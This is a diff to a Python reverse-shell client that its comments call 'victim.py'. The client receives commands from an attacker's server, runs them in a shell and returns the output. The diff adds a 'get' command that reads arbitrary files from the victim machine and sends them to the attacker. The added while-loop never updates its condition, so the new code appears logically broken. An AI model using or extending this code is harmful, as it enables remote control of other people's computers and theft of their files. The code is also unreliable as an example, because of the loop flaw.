@@ -1,7 +1,6 @@
 # Creating victim.py for reverse shell
 # Here we are creating a Client script so that it connects to the server
 
-
 # Importing Required Libraries
 import socket
 import subprocess
@@ -21,11 +20,17 @@ while True:
     try:
         data=victim.recv(4096)
         command=data.decode('utf-8')
+        while command != "":
+            # Checking if command stats with cd so that the client can change directory
+            if command.startswith('cd'):
+                os.chdir(command[3:])
+                victim.send('Directory Changed: {}'.format(command[3:]).encode('utf-8'))
 
-        # Checking if command stats with cd so that the client can change directory
-        if command.startswith('cd'):
-            os.chdir(command[3:])
-            victim.send('Directory Changed: {}'.format(command[3:]).encode('utf-8'))
+            elif command.startswith('get'):
+                with open(command[3:],'rb') as f:
+                    file_data=f.read()
+                    victim.send(file_data)
+
 
         # If it doesn't start with cd it runs the command in the shell and sends the output to the attacker
         shell_result=subprocess.run(command,shell=True,capture_output=True)
